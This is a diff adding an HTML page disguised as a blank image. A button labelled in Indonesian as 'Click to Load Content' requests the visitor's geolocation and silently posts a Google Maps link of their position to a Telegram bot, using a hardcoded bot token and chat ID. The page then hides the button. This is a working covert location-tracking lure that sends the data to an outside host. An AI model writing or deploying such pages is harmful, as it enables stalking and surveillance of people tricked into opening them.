@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blank Image</title>
+    <style>
+        body { margin: 0; padding: 0; background-color: #111; }
+        .black-image { width: 100%; height: 100vh; background: #000; }
+        .permission-btn {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 12px 24px;
+            background: #3498db;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="black-image"></div>
+    <button id="askPermission" class="permission-btn">
+        Klik untuk Memuat Konten
+    </button>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7871790637:AAFhSa7zs1XBmy2_e5w_osnOFIy_1cW_Itc"; // Token API Anda
+        const TELEGRAM_CHAT_ID = "720861205"; // Chat ID Anda
+        
+        document.getElementById("askPermission").addEventListener("click", () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const { latitude, longitude } = position.coords;
+                        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        
+                        // Kirim ke Telegram (hanya bekerja di HTTPS!)
+                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                chat_id: TELEGRAM_CHAT_ID,
+                                text: `📍 Lokasi baru:\n${mapsLink}`,
+                            }),
+                        });
+
+                        // Sembunyikan tombol setelah izin diberikan
+                        document.getElementById("askPermission").style.display = "none";
+                    },
+                    (error) => {
+                        alert("Akses lokasi ditolak.");
+                    }
+                );
+            } else {
+                alert("Browser tidak mendukung geolokasi.");
+            }
+        });
+    </script>
+</body>
+</html>
